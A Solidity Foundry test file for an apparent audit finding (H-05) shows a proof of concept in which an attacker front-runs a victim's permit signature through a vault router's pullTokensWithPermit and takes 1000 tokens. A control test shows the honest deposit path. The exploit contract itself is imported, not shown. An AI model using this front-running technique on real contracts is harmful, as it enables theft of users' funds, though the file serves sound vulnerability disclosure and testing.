// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, PermitToken, VaultRouter} from "./49644-h-05-the-implementation-of-pulltokenswithpermit-poses-a-risk.sol";

contract Finding49644Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant EXPLOIT = 0x15452EC016c4dc8c549E7fe6Ff4b26324Ea8b7A4;
    address internal constant VICTIM = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    function _deploy() internal returns (Exploit e) {
        vm.setNonce(ATTACKER, 1);
        vm.prank(ATTACKER);
        e = new Exploit();
        assertEq(address(e), EXPLOIT, "exploit address");
    }

    function test_exploit_frontrun_permit_steals_1000() public {
        Exploit e = _deploy();
        vm.prank(ATTACKER);
        e.run();
        assertEq(e.token().balanceOf(ATTACKER), 1000 ether, "attacker got 1000");
        assertEq(e.token().balanceOf(VICTIM), 0, "victim drained");
    }

    function test_control_victim_deposits_own_permit() public {
        Exploit e = _deploy();
        e.fundVictim();
        vm.startPrank(VICTIM);
        e.router().pullTokensWithPermit(VICTIM, 1000 ether, e.DEADLINE(), e.V(), e.R(), e.S());
        e.router().deposit();
        vm.stopPrank();
        assertEq(e.token().balanceOf(ATTACKER), 0, "attacker got nothing");
        assertEq(e.router().shares(VICTIM), 1000 ether, "victim credited");
        assertEq(e.token().balanceOf(address(e.router())), 1000 ether, "tokens stayed for the deposit");
    }
}
